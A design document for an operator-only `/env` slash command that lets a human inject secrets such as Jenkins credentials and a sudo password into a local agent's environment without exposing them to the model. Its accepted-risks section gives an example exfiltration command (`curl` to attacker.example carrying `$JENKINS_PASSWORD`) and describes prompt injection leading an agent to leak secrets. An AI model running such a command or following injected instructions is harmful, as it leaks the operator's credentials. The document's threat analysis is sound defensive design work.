# Design: Operator-Only `/env` Slash Command for Runtime Secret Injection

> Status: **Accepted — implemented.** This document describes behavior and rationale, not implementation
> details. Code paths, line numbers, and file layouts are intentionally omitted so the design
> does not go stale when code moves.
> Scope: local, single-user agent. This is explicitly not a general secret-management system.

## 1. Problem

Two concrete failures motivate this design:

1. **sudo blocks the agent.** Password-based sudo support exists, but the password has to be
   present in the agent process environment before startup. There is no way to supply or rotate
   it mid-session. Without it, sudo either succeeds via a narrow passwordless rule or a valid
   timestamp cache, or fails fast — it must never hang on a non-interactive stdin.
2. **Other credentials cannot be handed to the model.** For a Jenkins skill, a token cannot be
   sent in a prompt or stored in a plaintext file that the agent may read: either path puts the
   value into the model context, which sends it to the model provider. The agent needs to *use*
   the credential but must never *see* the value.

The desired property: a human can inject, inspect, and remove credentials while the agent is
running, and the agent can consume them by name (`$JENKINS_PASSWORD`) without the value ever
entering a tool call argument or the conversation.

## 2. Goals and non-goals

### Goals

- Human operator can set, read, list, and unset environment variables at runtime with a slash
  command.
- Agent can use values indirectly from bash via ordinary shell expansion (`$NAME`).
- The secret value never enters the agent/model context.
- Minimum implementation: no new infrastructure, no new model-facing tool.

### Non-goals

- Multi-user isolation, per-agent scopes, ACLs, audit logs.
- `SecretRef`, redaction hooks, credential helper services, or MCP-based per-tool injection.
- Preventing an agent from deliberately printing or exfiltrating a value it can expand.
- Persistence across restarts. Values live for the lifetime of the agent process.
- Encrypting or hiding values from the operator. The operator is trusted.

## 3. Core invariant: slash commands are an operator channel

This design relies on a behavioral contract that the implementation must preserve:

- A registered slash command is dispatched synchronously to its handler and does **not** become
  an agent turn.
- The command text and the handler's output are delivered to the human client only.
- They are not appended to the conversation history and therefore cannot be replayed into a
  later model request.
- The handler must not start a prompt, a steer, or a follow-up, and must not be exposed as a
  model-facing tool.

Consequence: `/env ...` is a side channel for the human. The model may learn *that* a variable
was set (the operator can tell it), but it never receives the value from this mechanism.

Do not weaken this invariant. In particular, do not add session persistence for `/env` results,
and do not copy the special handling used by commands that echo their own command text.

## 4. Command surface

| Command | Behavior |
|---|---|
| `/env set NAME value` | Set `NAME` to `value` in the agent process. `value` may contain spaces. |
| `/env get NAME` | Return the plaintext value to the human client. |
| `/env list` | List the agent process environment as `NAME=value` lines, plaintext, to the human client. |
| `/env unset NAME` | Remove `NAME` from the agent process environment. |

Notes:

- `get` and `list` deliberately return plaintext. This is the human reading their own
  credentials, not a leak into the model. The operator channel is the point.
- `list` covers the process environment, so a password supplied at startup (for example
  `SUDO_PASSWORD`) is visible there too.
- Names must be valid environment-variable names. A value containing spaces must survive
  parsing intact.
- Unknown subcommands produce a short usage error on the human client.

The sudo variable name is standardized as **`SUDO_PASSWORD`**. Do not use `SUDOPASSWD` or other
spellings; only the canonical name is recognized.

## 5. Runtime model

- The agent process owns its environment. A setter changes that process environment; it does
  not write a file and does not put the value in a prompt.
- Shell commands executed by the agent inherit that environment, so `$NAME` expands at
  execution time in the shell.
- Expansion is the shell's job. The tool must not parse `$NAME` or substitute placeholders in
  Go: shell syntax is arbitrary and any Go-side parser would be both incomplete and unnecessary.
- `SUDO_PASSWORD` is read on each sudo invocation, so a runtime set or unset takes effect for
  the next command in the same session.
- Unset removes the variable from the process only. The parent shell that launched the agent is
  unaffected; this is desirable.

The agent's side of the contract is prompt-level only: use `$NAME` in bash commands, never ask
the model to print the value. There is no enforcement beyond the fact that the value was never
placed in context.

## 6. Concrete example: Jenkins logs

The operator has a Jenkins account with username `aaa` and password `bbb`, and wants the agent
to fetch a build log.

**Human, in the client (operator channel):**

```text
/env set JENKINS_USER aaa
/env set JENKINS_PASSWORD bbb
/env list
```

`/env list` shows, among other process variables:

```text
JENKINS_USER=aaa
JENKINS_PASSWORD=bbb
```

This output is rendered in the human client only; it is not stored in the conversation.

**Agent, in a bash tool call:**

```bash
curl -fsS -u "$JENKINS_USER:$JENKINS_PASSWORD" \
  https://jenkins.example.com/job/demo/42/consoleText
```

The model sees the tool call above with `$JENKINS_USER` and `$JENKINS_PASSWORD`, never `aaa` or
`bbb`. `/bin/sh` expands both variables when the command runs. The same pattern works for sudo:

```text
/env set SUDO_PASSWORD bbb
```

```bash
sudo apt-get update
```

**Human, after the task:**

```text
/env unset JENKINS_USER
/env unset JENKINS_PASSWORD
/env unset SUDO_PASSWORD
```

If the agent is instead told to run `echo "$JENKINS_PASSWORD"`, the shell will expand it and the
value can appear in tool output. That is an accepted risk, analyzed below.

## 7. Why this is the simplest viable design

Industry consensus does not try to make the model a safe place for secrets; it keeps secrets out
of the context window entirely.

- **Decide / Do separation.** Auth0's guidance is explicit: *"if you don't want your AI agent to
  reveal a secret, don't give it access to that secret"*, and warns that "do not reveal this
  token" inside a skill prompt is not a security boundary because instruction following is
  probabilistic. The LLM decides intent and parameters; deterministic code performs the action
  and touches the credential. This design matches: the model writes `$JENKINS_PASSWORD`, the
  shell and the tool do the expansion.
  <https://auth0.com/blog/want-ai-agents-that-don-t-spill-secrets-don-t-give-them-secrets>
- **Runtime injection over plaintext files.** Infisical argues that agents read files in the
  workspace but do not read another process's environment, and recommends injecting secrets at
  process start rather than keeping them in `.env`.
  <https://infisical.com/blog/your-ai-coding-agent-is-reading-your-env-file>
  `/env set` is the manual, process-lifetime version of that pattern.
- **Operator-channel precedent.** Hermes Agent documents `/reload` as "Reload `.env` variables
  into the running session (picks up new API keys without restarting)" and supports custom
  slash commands that run shell commands without invoking the LLM. Same shape: a human-facing
  command that changes runtime state, outside the model turn.
- **Anthropic's own risk framing:** "Anything an agent can read, it can leak", addressed with
  layered controls rather than trust in the model.
  <https://claude.com/resources/articles/enterprise-guide-to-securing-coding-agents>

Other agents (Claude Code, Aider, Codex, OpenClaw) configure credentials at startup through
config files or `.env`; none provide a runtime `/env set`. So this is a local simplification of
the runtime-injection idea, not a copied feature — but it sits squarely inside the recommended
architecture.

## 8. Accepted risks and compensating controls

### Accepted risk

If the agent is induced (by prompt injection from a webpage, issue, tool result, etc.) to run
`echo $JENKINS_PASSWORD` or `curl https://attacker.example/?x=$JENKINS_PASSWORD`, the shell
expands the value and it can appear in tool output or leave the machine. A known report of this
class is `anthropics/claude-code#62156` ("Shell output exposes sensitive environment variable").

This design does **not** solve that. Solving it would require output redaction, egress control,
or credential-level isolation — all deliberately out of scope here. The agent is trusted to
follow "use `$NAME`, don't print it"; a compromised agent can violate that.

### Where the real mitigation lives

The strongest, most consistently recommended controls are outside the agent:

- **Short-lived / per-task credentials.** A static key may stay useful for months; a 15-minute
  token caps the exposure window at 900 seconds. HashiCorp and GitGuardian both recommend
  dynamic, auto-expiring credentials for agentic systems.
  <https://www.hashicorp.com/en/blog/why-we-need-short-lived-credentials-and-how-to-adopt-them>
  <https://blog.gitguardian.com/short-lived-credentials-in-agentic-systems-a-practical-trade-off-guide>
- **Bind the credential to a source IP / audience where the provider supports it**, so a leaked
  value is unusable elsewhere. This is the most practical single control for a local user.
  <https://crimede-coder.com/blogposts/2025/CodingAgentRisks>
- **Remove long-lived sudo passwords entirely** by using a narrowly scoped `NOPASSWD` sudoers
  rule. That is a credential/config change, not an agent feature.
- Secret scanning and rotation, on the assumption that leaks will happen.

For the local single-user case, the recommendation is therefore: implement `/env` for
convenience, but prefer short-lived Jenkins tokens and scoped passwordless sudo so that a leak
has a small blast radius. No new agent-side machinery is needed for that.

## 9. Explicitly deferred alternatives

| Alternative | Why not now |
|---|---|
| Put the value in a tool schema or system prompt | Directly exposes it to the model; the exact failure being avoided. |
| `.env` file + reload command | Plaintext on disk, readable by the agent's file tools. |
| Go-side `$NAME` detection in the tool | Shell syntax is arbitrary; expansion already works. |
| Output redaction hooks | Adds complexity and is bypassable; accepted risk for now. |
| `SecretRef`, scope/ACL layer, credential helper, per-tool MCP injection | Correct at enterprise scale, overkill for one local user. |
| Persistent encrypted env store | Adds setup and lock-in; process-lifetime state is enough. |

## 10. Acceptance criteria

1. A runtime set is immediately visible to later bash calls via `$NAME`, including values with
   spaces.
2. `get` and `list` show plaintext values in the human client only; the conversation history
   contains neither the slash command nor its output.
3. `unset` removes the variable so later bash calls see an empty expansion.
4. Setting `SUDO_PASSWORD` at runtime makes the next sudo command use the password path.
5. Invalid names and malformed invocations return a short human-readable error instead of
   changing the environment.

## 11. Resolved decisions

- **`list` output:** includes plaintext values, since the operator explicitly wants to read
  what is set.
- **Persistence:** none; values disappear when the agent process exits.
- **Variable name:** canonical `SUDO_PASSWORD` only.
- **`unset`:** included in the initial command set; `set NAME ""` is not the intended way to
  clear a value.